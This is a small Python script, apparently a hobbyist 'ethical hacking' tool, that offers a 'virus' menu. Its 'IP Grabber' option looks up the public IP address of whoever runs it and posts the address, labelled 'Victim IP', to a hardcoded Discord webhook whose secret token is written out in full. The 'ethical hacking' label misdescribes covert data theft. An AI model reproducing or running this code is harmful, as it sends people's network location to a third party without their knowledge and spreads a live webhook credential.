# Author: wingsscripts
version = "1.0.4"

import requests
import os

print("WINGERTOOL ethical hacking")
print("")

print("Loading")

# Grabbing IP
def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org", timeout=5)
        return response.text
    except requests.RequestException:
        return "Error (cant get IP)"

# WEBHOOK
webhook_url = "https://discord.com/api/webhooks/1393916680530427915/gDUBIpEYftGEIRdo0K0dwD4LHW0pnVdqOUPlcgR8v37R2vW7QSs1CLu7JSSRq7Hv1Luz"
dane = get_public_ip()

print("Loaded successfully✅")

print("Choose a virus")
print("[1] IP Grabber")
print("[2] INFO")
chooseOption = int(input(""))

if chooseOption == 1:
    get_public_ip()

    payload = {
        "content": f"Victim IP: `{dane}`"
    }
    response = requests.post(webhook_url, json=payload)

    if response.status_code == 204:
        print("✅ Hacked successfully")
    else:
        print(f"❌ Error: {response.status_code}")
elif chooseOption == 2:
    print(f"Discord: xw1nger")
    print(f"Github: wingsscripts")
    print(f"Version: {version}")
    